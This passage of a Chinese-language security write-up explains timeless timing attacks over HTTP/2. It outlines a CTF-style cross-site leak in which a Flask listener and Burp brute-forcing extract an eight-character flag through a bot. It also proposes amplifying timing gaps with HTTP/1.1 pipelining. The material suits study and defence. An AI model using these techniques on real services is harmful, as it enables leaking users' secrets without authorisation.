+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>  
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>将flask服务器架设起来接收结果。</p>
+<p>打开burp用测试器爆破，提交架设的页面让bot去访问，Payload选择小写字母和数字(因为flag只有八位小写字母和数字)，爆破完一位往flask代码里再加一位就好了。</p>
+<h2 data-content="1" id="bc1f347b63792e0a93ff8fb8c0537117">5 总结</h2>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220430000802267.png"/></p>
+<ul>
+<li>Timeless timing攻击不受网络抖动因素的影响</li>
+<li>远程的计时攻击具有与本地系统上的攻击者相当的性能</li>
+<li>可以针对具有多路复用功能的协议发起攻击或利用启用封装的传输协议</li>
+<li>所有符合标准的协议都可能受到Timeless timing attck：在实际场景下我们创建了针对 HTTP/2 和 EAP-pwd (Wi-Fi) 的攻击</li>
+</ul>
+<h2 data-content="1" id="b32662790d20b64aa46d5062fef756ff">6 拓展与延申</h2>
+<p>论文中提到，在HTTP/2协议的情况下，我们可以利用多路封装协议来完成timeless timing attck；但目前主流网络环境仍使用HTTP/1.1，所以出了论文中提到的基于报文封装的限制性较大的方法，还有没有办法能够在HTTP/1.1协议下完成Timeless timing attck呢？</p>
+<p>我们可以考虑HTTP/1.1的pipeline，这是HTTP持续连接的工作方式之一，其特点是客户在收到HTTP的响应报文之前就能够接着发送新的请求报文。于是一个接一个的请求报文到达服务器后，服务器就可持续发回响应报文。</p>
+<p>总结一下特点：</p>
+<ol>
+<li>由于pipeline是强制顺序响应的，那么其请求和响应的顺序是强制固定的</li>
+<li>服务端在接受pipeline的请求时以单一线程对其进行分割并进行处理，只有请求1处理完成后才会处理请求2</li>
+</ol>
+<p>pipeline是单线程顺序处理，那么就算时间有延迟我们也难以发现，这种情况下可以考虑放大。 <strong>既然pipeline是单线程，那么我就利用pipeline单线程不断的处理同一个请求，假如请求A和请求B的执行时间差异1ms，那么请求A*1000和请求B*1000的整个时间差异就可以达到1秒！</strong></p>
+<p>但实际情况下我们并不能进行无限制的放大。在实际的场景里，pipeline的最大处理请求数受到服务器中间件的配置影响，比如apache里默认在启用keepalive的情况下会设置pipeline最大支持请求为100个。</p>
+<p>当然，如果响应里keepalive只有一个timeout并没有max的情况下则意味着其没有对pipeline数量进行限制，那么也就是说我们的放大场景是存在的这时候只要无限的构造pipeline请求就可以无限叠加倍率。</p>
+<p>这样我们就可以在HTTP/1.1的场景下使用，虽然这样的站点不是很多但也算是另辟蹊径。</p>
+<p>参考</p>
+<p><a href="http://blog.zeddyu.info/2022/02/21/2022-02-21-PracticalTimingTimeless/#others" target="_blank">http://blog.zeddyu.info/2022/02/21/2022-02-21-PracticalTimingTimeless/#others</a></p>
+<p><a href="https://www.usenix.org/system/files/sec20-van_goethem.pdf" target="_blank">https://www.usenix.org/system/files/sec20-van_goethem.pdf</a></p>
+<p><a href="http://www.ctfiot.com/34572.html" target="_blank">http://www.ctfiot.com/34572.html</a></p>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/xs-search" target="_blank">https://book.hacktricks.xyz/pentesting-web/xs-search</a></p>
+<p><a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/</a></p>
+</div>
+</div>
